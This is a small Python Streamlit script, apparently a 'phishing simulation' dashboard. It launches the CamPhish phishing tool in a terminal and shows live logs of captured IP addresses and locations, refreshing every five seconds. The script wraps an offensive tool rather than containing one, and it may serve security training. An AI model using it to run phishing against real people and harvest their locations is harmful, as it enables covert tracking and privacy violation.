import streamlit as st
import subprocess
import os
import time

CAMPHISH_PATH = "/home/kali/Downloads/PhishGuard/CamPhish/"  
IP_LOG_FILE = os.path.join(CAMPHISH_PATH, "saved.ip.txt")  # IP logs
LOCATION_LOG_FILE = os.path.join(CAMPHISH_PATH, "saved.locations.txt")  # Location logs

def run_camphish():
    """Launch CamPhish in a normal terminal."""
    st.write("🚀 Opening a terminal to run CamPhish...")
    
    if os.name == "posix":  # Linux/macOS
        subprocess.Popen(["x-terminal-emulator", "-e", f"bash -c 'cd {CAMPHISH_PATH} && bash camphish.sh; exec bash'"])
    elif os.name == "nt":  # Windows
        subprocess.Popen(["cmd.exe", "/c", f"cd /d {CAMPHISH_PATH} && bash camphish.sh && pause"], shell=True)
    else:
        st.error("❌ Unsupported OS!")

def get_latest_logs(log_file):
    """Read the latest lines from a log file."""
    if not os.path.exists(log_file):
        return ["No data available yet."]
    
    with open(log_file, "r") as file:
        logs = file.readlines()
    
    return logs[-5:] if logs else ["No data available yet."]

# Streamlit UI
st.title("🎭 CamPhish Phishing Simulation")

if st.button("Run CamPhish"):
    run_camphish()

st.subheader("🌍 Captured IPs")
st.text("\n".join(get_latest_logs(IP_LOG_FILE)))

st.subheader("📍 Captured Locations")
st.text("\n".join(get_latest_logs(LOCATION_LOG_FILE)))

# Auto-refresh logs every 5 seconds
time.sleep(5)
st.rerun()
